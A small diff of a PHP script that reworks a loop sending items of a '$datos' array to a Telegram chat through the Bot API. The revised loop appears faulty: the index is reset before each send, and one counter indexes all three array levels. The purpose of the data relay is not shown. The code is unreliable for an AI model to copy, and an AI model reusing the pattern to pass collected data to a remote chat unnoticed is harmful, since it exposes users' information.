@@ -71,10 +71,12 @@ else{
 		//$url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=" . urlencode("$mensaje");
 		}
 	  
-   		 for($xx = 0; $xx <= $controllo;){
-			   $xx = $xx + 1;
-			   $indice = $xx - 1;
+   		 for($xx = 0; $xx <= $controllo; $xx = $xx + 1){
+			 
+			   $indice = 0;
+			   
 			   http_request("https://api.telegram.org/bot{$token}/sendMessage?chat_id=".$chat_id."&text=".$indice."-".$datos[$xx][$xx][$xx]);
+			   $indice = $xx + 1;
 			   $text = " ";
 			}	  
 	  
